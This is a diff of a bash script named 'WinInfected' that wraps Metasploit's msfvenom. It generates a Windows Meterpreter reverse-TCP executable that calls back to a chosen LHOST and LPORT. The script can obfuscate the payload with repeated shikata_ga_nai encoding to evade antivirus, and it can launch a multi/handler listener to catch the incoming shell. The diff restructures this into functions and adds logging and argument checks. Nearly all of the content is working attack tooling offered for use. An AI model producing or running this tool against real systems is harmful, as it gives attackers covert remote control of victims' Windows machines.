@@ -1,4 +1,5 @@
 #!/bin/bash
+
 show_help() {
   echo "WinInfected v1.2"
   echo "Usage: $0 [LHOST] [LPORT] [--obfuscate]"
@@ -9,9 +10,11 @@ show_help() {
   echo "  --update         Update script and dependencies."
   echo "  --obfuscate      Enable payload obfuscation using x86/shikata_ga_nai encoder."
   echo "  -h, --help       Display this help message."
+  echo
   echo "More information: https://github.com/byfranke/WinInfected"
   echo
 }
+
 check_and_install_dependencies() {
   echo "Checking and installing dependencies..."
   if ! command -v msfvenom &> /dev/null; then
@@ -27,11 +30,48 @@ check_and_install_dependencies() {
     echo "msfconsole is already installed."
   fi
 }
+
 update_script_and_dependencies() {
   echo "Updating Metasploit Framework..."
   sudo apt update && sudo apt install metasploit-framework -y
   echo "Script and dependencies updated successfully."
 }
+
+validate_arguments() {
+  if ! [[ "$LHOST" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+    echo "Error: Invalid LHOST format."
+    exit 1
+  fi
+
+  if ! [[ "$LPORT" =~ ^[0-9]+$ ]]; then
+    echo "Error: Invalid LPORT format."
+    exit 1
+  fi
+}
+
+create_payload() {
+  if [ "$OBFUSCATE" -eq 1 ]; then
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -e x86/shikata_ga_nai -i 5 -f exe -o "$PAYLOAD_PATH"
+  else
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$PAYLOAD_PATH"
+  fi
+
+  if [ ! -f "$PAYLOAD_PATH" ]; then
+    echo "Failed to create payload with msfvenom."
+    exit 1
+  fi
+}
+
+log_action() {
+  LOGFILE="wininfected.log"
+  echo "$(date) - $1" >> "$LOGFILE"
+}
+
+if [ "$EUID" -ne 0 ]; then
+  echo "Please run as root"
+  exit
+fi
+
 if [ "$#" -eq 0 ] || [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
   show_help
   exit 0
@@ -42,33 +82,36 @@ elif [ "$1" == "--update" ]; then
   update_script_and_dependencies
   exit 0
 fi
+
 if [ "$#" -lt 2 ]; then
   echo "Error: Missing arguments."
   show_help
   exit 1
 fi
+
 LHOST="$1"
 LPORT="$2"
 OBFUSCATE=0
+
 if [ "$#" -ge 3 ] && [ "$3" == "--obfuscate" ]; then
   OBFUSCATE=1
 fi
+
+validate_arguments
+
 PAYLOAD_DIR="$(pwd)"
 PAYLOAD_NAME="payload_$(date +%Y%m%d_%H%M%S).exe"
 PAYLOAD_PATH="$PAYLOAD_DIR/$PAYLOAD_NAME"
-if [ "$OBFUSCATE" -eq 1 ]; then
-  msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -e x86/shikata_ga_nai -i 5 -f exe -o "$PAYLOAD_PATH"
-else
-  msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$PAYLOAD_PATH"
-fi
-if [ ! -f "$PAYLOAD_PATH" ]; then
-  echo "Failed to create payload with msfvenom."
-  exit 1
-fi
+
+create_payload
+
+log_action "Payload created successfully: $PAYLOAD_PATH"
+
 echo "Payload created successfully: $PAYLOAD_PATH"
 read -p "Do you want to start msfconsole to listen for connections? (y/n): " start_msf
+
 if [ "$start_msf" == "y" ]; then
-  msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit;"
+  msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit -j;"
 elif [ "$start_msf" == "n" ]; then
   echo "Exiting script."
 else
